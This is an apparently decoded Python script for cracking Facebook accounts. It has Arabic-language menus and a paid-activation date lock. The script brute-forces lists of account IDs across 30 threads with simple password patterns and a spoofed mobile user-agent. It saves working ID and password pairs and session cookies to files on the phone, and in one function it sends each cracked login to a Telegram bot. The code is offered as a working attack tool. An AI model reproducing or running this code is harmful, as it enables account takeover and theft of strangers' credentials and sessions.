print(('\033[92m—'*25)+'\n• DeCoDe By @FF22L•\n'+('—'*25))
import datetime;now = datetime.date.today();target = datetime.date(2024,9,12,)
if now >=target:print(" FF22L لا ضوج 💲 راسلني حتى افعلك @$$")
else:print("حﺎﺠﻨﺑ ﻞﻴﻐﺸﺗ ﻢﺗ✅")
from os import path
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                  • \33[1;38mFF22L ]\33[1;38m        ║\033[1;31m 
╠══[Github                       • \33[1;38m messi]      ║\33[1;34m   
╠══[TOOLS                    • Paid]          ║ \33[1;32m   
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/A_T_9.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;91m [01] \x1b[1;92mﺪﻴﺼﻟﺍ ﻖﻳﺮﻃ😈✅')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print(f'\n\n\n{a26}❲ 𝟏 ❳ ✩⋗🔥ﻪﻳﻮﻗ ﺕﺍﺩﺭﻮﺒﺳﺎﺑ •\n{m1}❲ 𝟐 ❳ ✩ ⋗ ﻚﺒﻴﺟ ﻦﻣ ﺕﺍﺩﺭﻮﺒﺳﺎﺑ • \n{B}❲ 𝟑 ❳ ✩ ⋗ \x1b[1;94mتﺎﻳﻮﻗ ﺪﻴﻟﺍﻮﻣ تﺍﺩﺭﻮﺳﺎﺑ  • \n{V}❲ 𝟒 ❳ ✩ ⋗ 🔥🆕ﻪﻗﻭﺮﻄﻤﻣ ﺕﺍﺩﺭﻮﺒﺳﺎﺑ •\n');linex()
                                ppp=input(f'{U} Choice°∆°----------->')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('1@2@3@4@5@')
                                        plist.append('qqaazzqqaazz')
                                        plist.append('07700770')
                                        plist.append('0780780')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mتﺎﻳﺪﻳﺍ ﻒﻠﻣ دﺪﻋ😎 : \033[1;32m'+total_ids)
                                        print("\033[1;32m ff22l ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ🔥")
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m ff22l ﻪﻄﺳﺍﻮﺑ ﻞﻴﻐﺸﺗ ﻢﺗ')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mff22l 😈\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [Messi 🔥-OK] %s | %s'%(ids,pas))
                                bn = ('\r\r\033[1;32m [Messi🔥-OK] '+ids+' | '+pas+'\033[1;97m')
                                ...
                                open('/sdcard/Messi-⭐COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/Messi✈️-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Messi✅-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [Messi💸] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Messi✅-OK] '+ids+' | '+pas+'\033[1;97m')
                                        bn = ('\r\r\033[1;32m [Messi✅-OK] '+ids+' | '+pas+'\033[1;97m')
                                        requests.post(f"https://api.telegram.org/bot{Goldtok}/sendMessage?chat_id={Goldid}&text="+str(bn))
                                        open('/sdcard/Messi✅-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [DEC_Messi] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mDECODEDBY @Messi\n[Messi✅-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Messi✅-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Messi-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Mess❌i-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/Messi❌-CP.txt','a').write(ids+'|'+pas+'\n')
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Messi-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/Messi-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Messi_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [messi🎭-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Messi🥇-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
